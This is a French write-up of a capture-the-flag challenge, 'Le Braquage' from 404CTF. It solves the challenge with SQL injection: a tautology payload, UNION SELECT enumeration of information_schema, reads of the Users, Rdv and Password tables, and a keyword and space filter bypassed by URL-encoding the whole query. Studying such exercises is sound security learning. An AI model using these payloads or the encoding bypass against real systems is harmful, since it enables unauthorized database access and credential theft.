## Le Braquage

### Description

On se retrouve sur un site nous permettant d'effectuer des recherches dans une base de données. L'objectif est de trouver des morceaux de flag, afin de les concaténer. Un petit test (injecter ```'``` dans l'entrée du formulaire) nous permet de savoir rapidement ce qu'il va falloir faire, des injections SQL.

### Exploit

#### Première page
 
```
id=-1' OR 1=1 -- &pseudo=
```

On récupère 404CTF{0145769456} et 404CTF{21 rue des kiwis}, ainsi que son id valant 7456.

#### Deuxième page

```
pseudo=-1' UNION SELECT table_name, column_name FROM information_schema.columns -- 
```
On découvre la table Users avec les entrées nom et prénom. Ensuite :
```
pseudo=-1' union select nom,prenom from Users where id=7456 -- 
```
On récupère 404CTF{Vereux} et 404CTF{UnGorfou}.

#### Troisième page

Différents filtres sont mis en place : on ne peut pas utiliser ``select`` ni mettre d'espace dans la requête.
En passant ``%20``, soit le code URL d'un espace, en entrée, le filtre n'est pas activé.
On peut donc contourner le filtre en utilisant l'encodage URL.
```
code=%2d%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%74%61%62%6c%65%5f%6e%61%6d%65%2c%20%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%2c%20%31%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%6f%6c%75%6d%6e%73%20%2d%2d%20

En clair : code=-1' UNION SELECT table_name, column_name, 1 FROM information_schema.columns -- 
```
On trouve les tables Rdv et Password, qu'on lit avec :
```
code=%2d%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%2a%20%66%72%6f%6d%20%52%64%76%20%2d%2d%20

En clair : code=-1' UNION SELECT * from Rdv -- 
```
On récupère 404CTF{2022-07-14} et 404CTF{01hDuMatin}.

```
code=%2d%31%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%6d%64%70%2c%31%2c%31%20%66%72%6f%6d%20%50%61%73%73%77%6f%72%64%20%2d%2d%20

En clair : code=-1' UNION SELECT mdp,1,1 from Password -- 
```
On récupère 404CTF{GorfousAuPouvoir}.

On a donc le flag : 404CTF{VereuxUnGorfou014576945621ruedeskiwis2022-07-1401hDuMatinGorfousAuPouvoir}.